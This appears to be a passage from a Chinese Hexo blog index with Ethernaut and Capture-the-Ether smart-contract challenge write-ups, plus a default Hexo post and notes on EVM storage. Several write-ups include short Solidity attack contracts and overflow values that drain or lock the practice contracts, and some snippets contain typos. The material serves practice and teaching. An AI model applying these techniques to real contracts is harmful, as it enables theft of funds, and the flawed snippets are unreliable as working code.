withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] +=  amountToSend;    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint) &#123;        return address(this).balance;    &#125;&#125;\n当有人调用withdraw函数时，会将一些资金发送回所有者，我们要做到就是在partner地址中能够使交易回退，就可以保证后续的代码无法执行。\n仅仅通过revert()，我们无法拒绝提款，但可以通过消耗完gas，来拒绝交易进行。\n在solidity0.8.0版本之前，我们可以通过assembly(false)来消耗完所有的gas，在此之后assembly(false)不会消耗完所有的gas了，但可以通过汇编中的invalid()达到相同的效果：assembly&#123; invalid() &#125;\ncontract Hack &#123;  constructor(Denial target) &#123;    target.setWithdrawPartner(address(this));  &#125;  fallback() external payable &#123;     assembly&#123;      invalid()    &#125;  &#125;&#125;\n\n\nShop任务要求：想办法薅。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Buyer &#123;  function price() external view returns (uint);&#125;contract Shop &#123;  uint public price = 100;  bool public isSold;  function buy() public &#123;    Buyer _buyer = Buyer(msg.sender);    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;      isSold = true;      price = _buyer.price();    &#125;  &#125;&#125;\n因为合约对Buyer进行了两次price调用，那么我们可以在price函数中进行两次不同的操作，第一次正常大于价格，但在第二次调用时进行另一种逻辑，进行价格调整。\nview函数不能编写任何状态变量，通过自身的isSold进行条件判断。\ncontract Hack &#123;  Shop target;  constructor(address _tar) &#123;    target = Shop(_tar);  &#125;  function price() external view returns (uint) &#123;    if (!target.isSold()) &#123;      return 101;    &#125; else &#123;      return 0;    &#125;  &#125;  function pwn() external &#123;    target.buy();  &#125;&#125;\n\n\nDex任务要求：通过价格操纵窃取资金。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract Dex is Ownable &#123;  address public token1;  address public token2;  constructor() &#123;&#125;  function setTokens(address _token1, address _token2) public onlyOwner &#123;    token1 = _token1;    token2 = _token2;  &#125;    function addLiquidity(address token_address, uint amount) public onlyOwner &#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;    function swap(address from, address to, uint amount) public &#123;    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swapAmount = getSwapPrice(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swapAmount);    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);  &#125;  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableToken(token1).approve(msg.sender, spender, amount);    SwappableToken(token2).approve(msg.sender, spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableToken is ERC20 &#123;  address private _dex;  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;    _mint(msg.sender, initialSupply);    _dex = dexInstance;  &#125;  function approve(address owner, address spender, uint256 amount) public &#123;    require(owner != _dex, &quot;InvalidApprover&quot;);    super._approve(owner, spender, amount);  &#125;&#125;\n\n\nDex Two任务要求：从DexTwo合约中提取token1和token2的所有余额才能通过此题。\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;contract DexTwo is Ownable &#123;  address public token1;  address public token2;  constructor() &#123;&#125;  function setTokens(address _token1, address _token2) public onlyOwner &#123;    token1 = _token1;    token2 = _token2;  &#125;  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;    IERC20(token_address).transferFrom(msg.sender, address(this), amount);  &#125;    function swap(address from, address to, uint amount) public &#123;    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);    uint swapAmount = getSwapAmount(from, to, amount);    IERC20(from).transferFrom(msg.sender, address(this), amount);    IERC20(to).approve(address(this), swapAmount);    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);  &#125;   function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));  &#125;  function approve(address spender, uint amount) public &#123;    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);  &#125;  function balanceOf(address token, address account) public view returns (uint)&#123;    return IERC20(token).balanceOf(account);  &#125;&#125;contract SwappableTokenTwo is ERC20 &#123;  address private _dex;  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;    _mint(msg.sender, initialSupply);    _dex = dexInstance;  &#125;  function approve(address owner, address spender, uint256 amount) public &#123;    require(owner != _dex, &quot;InvalidApprover&quot;);    super._approve(owner, spender, amount);  &#125;&#125;\n\n\nPuzzle Wallet任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;pragma experimental ABIEncoderV2;import &quot;../helpers/UpgradeableProxy-08.sol&quot;;contract PuzzleProxy is UpgradeableProxy &#123;    address public pendingAdmin;    address public admin;    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;        admin = _admin;    &#125;    modifier onlyAdmin &#123;      require(msg.sender == admin, &quot;Caller is not the admin&quot;);      _;    &#125;    function proposeNewAdmin(address _newAdmin) external &#123;        pendingAdmin = _newAdmin;    &#125;    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);        admin = pendingAdmin;    &#125;    function upgradeTo(address _newImplementation) external onlyAdmin &#123;        _upgradeTo(_newImplementation);    &#125;&#125;contract PuzzleWallet &#123;    address public owner;    uint256 public maxBalance;    mapping(address =&gt; bool) public whitelisted;    mapping(address =&gt; uint256) public balances;    function init(uint256 _maxBalance) public &#123;        require(maxBalance == 0, &quot;Already initialized&quot;);        maxBalance = _maxBalance;        owner = msg.sender;    &#125;    modifier onlyWhitelisted &#123;        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);        _;    &#125;    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);      maxBalance = _maxBalance;    &#125;    function addToWhitelist(address addr) external &#123;        require(msg.sender == owner, &quot;Not the owner&quot;);        whitelisted[addr] = true;    &#125;    function deposit() external payable onlyWhitelisted &#123;      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);      balances[msg.sender] += msg.value;    &#125;    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);        balances[msg.sender] -= value;        (bool success, ) = to.call&#123; value: value &#125;(data);        require(success, &quot;Execution failed&quot;);    &#125;    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;        bool depositCalled = false;        for (uint256 i = 0; i &lt; data.length; i++) &#123;            bytes memory _data = data[i];            bytes4 selector;            assembly &#123;                selector := mload(add(_data, 32))            &#125;            if (selector == this.deposit.selector) &#123;                require(!depositCalled, &quot;Deposit can only be called once&quot;);                // Protect against reusing msg.value                depositCalled = true;            &#125;            (bool success, ) = address(this).delegatecall(data[i]);            require(success, &quot;Error while delegating call&quot;);        &#125;    &#125;&#125;\n\n\nMotorbike任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity &lt;0.7.0;import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;contract Motorbike &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;        struct AddressSlot &#123;        address value;    &#125;        // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.    constructor(address _logic) public &#123;        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;        (bool success,) = _logic.delegatecall(            abi.encodeWithSignature(&quot;initialize()&quot;)        );        require(success, &quot;Call failed&quot;);    &#125;    // Delegates the current call to `implementation`.    function _delegate(address implementation) internal virtual &#123;        // solhint-disable-next-line no-inline-assembly        assembly &#123;            calldatacopy(0, 0, calldatasize())            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            returndatacopy(0, 0, returndatasize())            switch result            case 0 &#123; revert(0, returndatasize()) &#125;            default &#123; return(0, returndatasize()) &#125;        &#125;    &#125;    // Fallback function that delegates calls to the address returned by `_implementation()`.     // Will run if no other function in the contract matches the call data    fallback () external payable virtual &#123;        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);    &#125;    // Returns an `AddressSlot` with member `value` located at `slot`.    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;        assembly &#123;            r_slot := slot        &#125;    &#125;&#125;contract Engine is Initializable &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address public upgrader;    uint256 public horsePower;    struct AddressSlot &#123;        address value;    &#125;    function initialize() external initializer &#123;        horsePower = 1000;        upgrader = msg.sender;    &#125;    // Upgrade the implementation of the proxy to `newImplementation`    // subsequently execute the function call    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;        _authorizeUpgrade();        _upgradeToAndCall(newImplementation, data);    &#125;    // Restrict to upgrader role    function _authorizeUpgrade() internal view &#123;        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);    &#125;    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.    function _upgradeToAndCall(        address newImplementation,        bytes memory data    ) internal &#123;        // Initial upgrade and setup call        _setImplementation(newImplementation);        if (data.length &gt; 0) &#123;            (bool success,) = newImplementation.delegatecall(data);            require(success, &quot;Call failed&quot;);        &#125;    &#125;        // Stores a new address in the EIP1967 implementation slot.    function _setImplementation(address newImplementation) private &#123;        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);                AddressSlot storage r;        assembly &#123;            r_slot := _IMPLEMENTATION_SLOT        &#125;        r.value = newImplementation;    &#125;&#125;\n\n\nDoubleEntryPoint任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;interface DelegateERC20 &#123;  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);&#125;interface IDetectionBot &#123;    function handleTransaction(address user, bytes calldata msgData) external;&#125;interface IForta &#123;    function setDetectionBot(address detectionBotAddress) external;    function notify(address user, bytes calldata msgData) external;    function raiseAlert(address user) external;&#125;contract Forta is IForta &#123;  mapping(address =&gt; IDetectionBot) public usersDetectionBots;  mapping(address =&gt; uint256) public botRaisedAlerts;  function setDetectionBot(address detectionBotAddress) external override &#123;      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);  &#125;  function notify(address user, bytes calldata msgData) external override &#123;    if(address(usersDetectionBots[user]) == address(0)) return;    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;        return;    &#125; catch &#123;&#125;  &#125;  function raiseAlert(address user) external override &#123;      if(address(usersDetectionBots[user]) != msg.sender) return;      botRaisedAlerts[msg.sender] += 1;  &#125; &#125;contract CryptoVault &#123;    address public sweptTokensRecipient;    IERC20 public underlying;    constructor(address recipient) &#123;        sweptTokensRecipient = recipient;    &#125;    function setUnderlying(address latestToken) public &#123;        require(address(underlying) == address(0), &quot;Already set&quot;);        underlying = IERC20(latestToken);    &#125;    /*    ...    */    function sweepToken(IERC20 token) public &#123;        require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;);        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));    &#125;&#125;contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;    DelegateERC20 public delegate;    function mint(address to, uint256 amount) public onlyOwner &#123;        _mint(to, amount);    &#125;    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;        delegate = newContract;    &#125;    function transfer(address to, uint256 value) public override returns (bool) &#123;        if (address(delegate) == address(0)) &#123;            return super.transfer(to, value);        &#125; else &#123;            return delegate.delegateTransfer(to, value, msg.sender);        &#125;    &#125;&#125;contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;    address public cryptoVault;    address public player;    address public delegatedFrom;    Forta public forta;    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;        delegatedFrom = legacyToken;        forta = Forta(fortaAddress);        player = playerAddress;        cryptoVault = vaultAddress;        _mint(cryptoVault, 100 ether);    &#125;    modifier onlyDelegateFrom() &#123;        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);        _;    &#125;    modifier fortaNotify() &#123;        address detectionBot = address(forta.usersDetectionBots(player));        // Cache old number of bot alerts        uint256 previousValue = forta.botRaisedAlerts(detectionBot);        // Notify Forta        forta.notify(player, msg.data);        // Continue execution        _;        // Check if alarms have been raised        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);    &#125;    function delegateTransfer(        address to,        uint256 value,        address origSender    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;        _transfer(origSender, to, value);        return true;    &#125;&#125;\n\n\nGoodSamaritan任务要求：拿走所有的钱。\n源代码\n// SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;contract GoodSamaritan &#123;    Wallet public wallet;    Coin public coin;    constructor() &#123;        wallet = new Wallet();        coin = new Coin(address(wallet));        wallet.setCoin(coin);    &#125;    function requestDonation() external returns(bool enoughBalance)&#123;        // donate 10 coins to requester        try wallet.donate10(msg.sender) &#123;            return true;        &#125; catch (bytes memory err) &#123;            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;                // send the coins left                wallet.transferRemainder(msg.sender);                return false;            &#125;        &#125;    &#125;&#125;contract Coin &#123;    using Address for address;    mapping(address =&gt; uint256) public balances;    error InsufficientBalance(uint256 current, uint256 required);    constructor(address wallet_) &#123;        // one million coins for Good Samaritan initially        balances[wallet_] = 10**6;    &#125;    function transfer(address dest_, uint256 amount_) external &#123;        uint256 currentBalance = balances[msg.sender];        // transfer only occurs if balance is enough        if(amount_ &lt;= currentBalance) &#123;            balances[msg.sender] -= amount_;            balances[dest_] += amount_;            if(dest_.isContract()) &#123;                // notify contract                 INotifyable(dest_).notify(amount_);            &#125;        &#125; else &#123;            revert InsufficientBalance(currentBalance, amount_);        &#125;    &#125;&#125;contract Wallet &#123;    // The owner of the wallet instance    address public owner;    Coin public coin;    error OnlyOwner();    error NotEnoughBalance();    modifier onlyOwner() &#123;        if(msg.sender != owner) &#123;            revert OnlyOwner();        &#125;        _;    &#125;    constructor() &#123;        owner = msg.sender;    &#125;    function donate10(address dest_) external onlyOwner &#123;        // check balance left        if (coin.balances(address(this)) &lt; 10) &#123;            revert NotEnoughBalance();        &#125; else &#123;            // donate 10 coins            coin.transfer(dest_, 10);        &#125;    &#125;    function transferRemainder(address dest_) external onlyOwner &#123;        // transfer balance left        coin.transfer(dest_, coin.balances(address(this)));    &#125;    function setCoin(Coin coin_) external onlyOwner &#123;        coin = coin_;    &#125;&#125;interface INotifyable &#123;    function notify(uint256 amount) external;&#125;\n先看GoodSamaritan合约，只有一个可调用方法requestDonation，以及在构造函数中创建了我们需要的Wallet和coin，这也限制了无法直接调用Wallet、coin中的方法。\n接着看requestDonation方法，他会通过wallet进行捐赠10金额给msg.sender，那我们进入Wallet中，调用donate10函数会先查看coin中wallet是否还有10金额的余额，如果没有会抛出一个NotEnoughBalance()错误，否则才会调用coin的transfer进行转账，\n接着又进入到coin中，transfer函数中currentBalance = balances[msg.sender]这一句代码也指示了我们需要通过wallet执行transfer，这样currentBalance才是我们的钱包余额。才能继续后面的操作：正常的余额增减，之后对我们传入的地址进行了一个是否是合约的判断：如果是将会转为INotifyable，调用notify函数；如果不是将会正常执行完交易，这就是整个requestDonation的流程，接着看catch的部分：\n如果接受到前面NotEnoughBalance()的错误，将会执行wallet的transferRemainder，而这个函数能够把wallet所有的coin全部转走。\n因此，我们要想一步转走这些余额，就必须通过transferRemainder来实现，也就是：通过一个合约，来正常调用requestDonation，然后在coin中进行transfer的时候，通过接口INotifyable的notify方法返回一个NotEnoughBalance()的错误，这样我们就由transferRemainder再一次进入coin的transfer中，而这一次我们就不需要返回错误，正常交易就行，因此对notify要求有条件性：当提款金额是10的时候抛出错误。这样就ok了\ninterface IGood &#123;    function requestDonation() external returns(bool enoughBalance);    function coin() external returns (address);    function wallet() external returns (address);&#125;interface Icoin &#123;  function balance() external returns (uint256);&#125;contract Hack &#123;  error NotEnoughBalance();  constructor(IGood target) &#123;    target.requestDonation();  &#125;  function notify(uint256 amount) external &#123;    if (amount == 10) &#123;      revert NotEnoughBalance();    &#125;  &#125;&#125;\n\n\nGatekeeperThree任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract SimpleTrick &#123;  GatekeeperThree public target;  address public trick;  uint private password = block.timestamp;  constructor (address payable _target) &#123;    target = GatekeeperThree(_target);  &#125;      function checkPassword(uint _password) public returns (bool) &#123;    if (_password == password) &#123;      return true;    &#125;    password = block.timestamp;    return false;  &#125;      function trickInit() public &#123;    trick = address(this);  &#125;      function trickyTrick() public &#123;    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;      target.getAllowance(password);    &#125;  &#125;&#125;contract GatekeeperThree &#123;  address public owner;  address public entrant;  bool public allowEntrance;  SimpleTrick public trick;  function construct0r() public &#123;      owner = msg.sender;  &#125;  modifier gateOne() &#123;    require(msg.sender == owner);    require(tx.origin != owner);    _;  &#125;  modifier gateTwo() &#123;    require(allowEntrance == true);    _;  &#125;  modifier gateThree() &#123;    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;      _;    &#125;  &#125;  function getAllowance(uint _password) public &#123;    if (trick.checkPassword(_password)) &#123;        allowEntrance = true;    &#125;  &#125;  function createTrick() public &#123;    trick = new SimpleTrick(payable(address(this)));    trick.trickInit();  &#125;  function enter() public gateOne gateTwo gateThree &#123;    entrant = tx.origin;  &#125;  receive () external payable &#123;&#125;&#125;\n\n\nSwitch任务要求：\n源代码\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Switch &#123;    bool public switchOn; // switch is off    bytes4 public offSelector = bytes4(keccak256(&quot;turnSwitchOff()&quot;));     modifier onlyThis() &#123;        require(msg.sender == address(this), &quot;Only the contract can call this&quot;);        _;    &#125;    modifier onlyOff() &#123;        // we use a complex data type to put in memory        bytes32[1] memory selector;        // check that the calldata at position 68 (location of _data)        assembly &#123;            calldatacopy(selector, 68, 4) // grab function selector from calldata        &#125;        require(            selector[0] == offSelector,            &quot;Can only call the turnOffSwitch function&quot;        );        _;    &#125;    function flipSwitch(bytes memory _data) public onlyOff &#123;        (bool success, ) = address(this).call(_data);        require(success, &quot;call failed :(&quot;);    &#125;    function turnSwitchOn() public onlyThis &#123;        switchOn = true;    &#125;    function turnSwitchOff() public onlyThis &#123;        switchOn = false;    &#125;&#125;\n","categories":["靶场"],"tags":["题解","Ethernaut","Ethereum","Remix"]},{"title":"Hello World","url":"/2022/12/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"temp","url":"/2023/04/08/temp/","content":"以太坊的数据存储对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。\npragma solidity^0.8.10;contract test&#123;    uint256 public a=9;    uint256[2] public b;    address c;    function t() public &#123;        b[0] = 63;        b[1] =96;        c = msg.sender;    &#125;&#125;\n这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。\nuint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享对于动态数据的存储，有着自己的计算规则：keccak256(bytes32(key)+bytes32(position))此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置\n"},{"title":"Capture-the-Ether","url":"/2023/04/01/Capture-the-Ether/","content":"由于Ropsten测试网络在2022.10.5日起已被正式弃用；因此该网页上的在线编写功能无法正常运行；所有实现均在remix上复现，收录在本系列之中，希望对各位看官有所帮助(TvT) (TvT) (TvT) (TvT) (TvT)\n\nLotteriesGuess Numberpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123;    uint8 answer = 42;    function GuessTheNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n题目直接给出了答案，直接填对于一个普通的数字，通过枚举它总是可以被猜中的，同时当有人知道了答案时，他就能直接获取奖励，很显然这对于其他不知道答案的人是极其不公平的；因此，我们对其进行处理改进：\nThe Secret Numberpragma solidity ^0.4.21;contract GuessTheSecretNumberChallenge &#123;    ---不同点---    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;    function GuessTheSecretNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;        function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (keccak256(n) == answerHash) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于结果是一个uint8的hash值所以我们只能够进行暴力枚举。\ncontract attack&#123;    function sol() public returns (uint8)&#123;        for(uint8 i=0;i&lt;255;i++)&#123;            if(keccak256(i)==            0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365)            &#123;retuen i;&#125;        &#125;    &#125;&#125;\n实现：这样的操作也只是避免了直接获取结果得出答案的情况——哈希算法是不可逆的加密算法，一定程度上提高了安全性，但仍然可以暴力枚举破解。\nThe Randon Numberpragma solidity ^0.4.21;contract GuessTheRandomNumberChallenge &#123;    uint8 answer;    function GuessTheRandomNumberChallenge() public payable &#123;        require(msg.value == 1 ether);        ---不同点---        answer = uint8(keccak256(block.blockhash(block.number - 1), now));    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n这次的结果是根据当前的区块数和时间来制定的，他是随机的，这样就大大的增强了安全强度，避免了反复使用一个结果。通过web3查询部署该合约时当前的区块高度和时间来得到answer，再进行输入即可。先获取合约所在块的高度或者区块哈希web3.eth.getTransaction(transactionHash).BlockNumber\\BlockHash再通过区块高度或区块哈希找当前区块的timestampweb3.eth.getBlock(BlockNumber).timestamp可以从返回值中看到\n\n另外，由于answer是存储在合约中的（storage）因此，只要我们理解了他是如何存储的我们也能够通过ethers.js中的getStorageAt方法来获取answer的值\n\nThe New Number在上一个的合约代码中我们可以看到answer是在合约部署时就已经赋值了，而这次我们将其放在方法中，只有在有用户使用这个方法时才对answer进行赋值操作。\npragma solidity ^0.4.21;contract GuessTheNewNumberChallenge &#123;    function GuessTheNewNumberChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function guess(uint8 n) public payable &#123;        require(msg.value == 1 ether);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));        if (n == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n由于block.number状态变量允许获取当前块的高度。但是，在EVM中执行事务的那一刻，由于显而易见的原因，尚未知道正在创建的块的blockhash，所以我们无法通过web3进行查询，但是在我们调用这一合约时，是在同一个区块进行的，也就是说通过攻击合约进行模拟挑战中的所有操作然后调用guess方法，而不需要通过在链下进行计算再提交答案并保证交易在下一区块立即被挖矿的情形。\ncontract attack&#123;    GuessTheNewNumberChallenge gus;    function attack(address _add) public&#123;        gue = GuessTheNewNumberChallenge(_add);    &#125;    function att()public payable&#123;        uint8 val = uint8(keccak256(block.blockhash(block.number - 1), now));        gue.guess.value(1 ether)(val);    &#125;&#125;\nPredict the futurepragma solidity ^0.4.21;contract PredictTheFutureChallenge &#123;    address guesser;    uint8 guess;    uint256 settlementBlockNumber;    function PredictTheFutureChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(uint8 n) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = n;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n先下注，后开奖。由于不能预测未来区块的内容，所以对于answer我们无法准确掌握，但是这里的answer是一个0~9的数，因此我们可以设定一个值等待answer自己撞上来。\ncontract attack&#123;    PredictTheFutureChallenge pre;    uint8 public answer=2;          function attack(address _add)public&#123;        pre = PredictTheFutureChallenge(_add);    &#125;    function lock()public payable &#123;        pre.lockInGuess.value(1 ether)(answer);    &#125;    function sol() public &#123;        uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;        if(temp == answer)&#123;            pre.settle();        &#125;    &#125;&#125;\n\nPredict the block hashpragma solidity ^0.4.21;contract PredictTheBlockHashChallenge &#123;    address guesser;    bytes32 guess;    uint256 settlementBlockNumber;    function PredictTheBlockHashChallenge() public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance == 0;    &#125;    function lockInGuess(bytes32 hash) public payable &#123;        require(guesser == 0);        require(msg.value == 1 ether);        guesser = msg.sender;        guess = hash;        settlementBlockNumber = block.number + 1;    &#125;    function settle() public &#123;        require(msg.sender == guesser);        require(block.number &gt; settlementBlockNumber);        bytes32 answer = block.blockhash(settlementBlockNumber);        guesser = 0;        if (guess == answer) &#123;            msg.sender.transfer(2 ether);        &#125;    &#125;&#125;\n同样是预测未来区块的内容，显然这根本是不可能的。但是在EVM中block.blockhash保存的最大数目是最近的256个区块，也即是说当超出最新区块256个区块之后的block.blockhash将被置为0。因此我们同样只需要等。（10s一个块，256*10&#x2F;60 过个一小时吧（笑）\nMathToken sale要求：转走合约中的余额\npragma solidity ^0.4.21;contract TokenSaleChallenge &#123;    mapping(address =&gt; uint256) public balanceOf;    uint256 constant PRICE_PER_TOKEN = 1 ether;    function TokenSaleChallenge(address _player) public payable &#123;        require(msg.value == 1 ether);    &#125;    function isComplete() public view returns (bool) &#123;        return address(this).balance &lt; 1 ether;    &#125;    function buy(uint256 numTokens) public payable &#123;        require(msg.value == numTokens * PRICE_PER_TOKEN);        balanceOf[msg.sender] += numTokens;    &#125;    function sell(uint256 numTokens) public &#123;        require(balanceOf[msg.sender] &gt;= numTokens);        balanceOf[msg.sender] -= numTokens;        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);    &#125;&#125;\n分析：因为合约的货币只有两个方法sell()、buy()，所以我们只有卖出比我们所购买的更多的货币才能达成address(this).balance &lt; 1 ether的条件。在买入时有这么一个检查：require(msg.value == numToken * PRICE_PER_TOKEN)，因为PRICE_PER_TOKEN是一个不可修改的值，但可以通过与numToken的乘积进行溢出，从而绕过检查uint256的最大值为2^256-1：115792089237316195423570985008687907853269984665640564039457584007913129639935，所以该值除以10^18后添个一就是造成溢出的最小值：115792089237316195423570985008687907853269984665640564039457 + 1溢出的结果为415992086870360064所以我们只需要发送415992086870360064wei，提出115792089237316195423570985008687907853269984665640564039458的购买量就能够获得大量的货币。之后，我们卖出1 ether来完成挑战\nToken Whale要求：拥有1,000,000的余额\npragma solidity 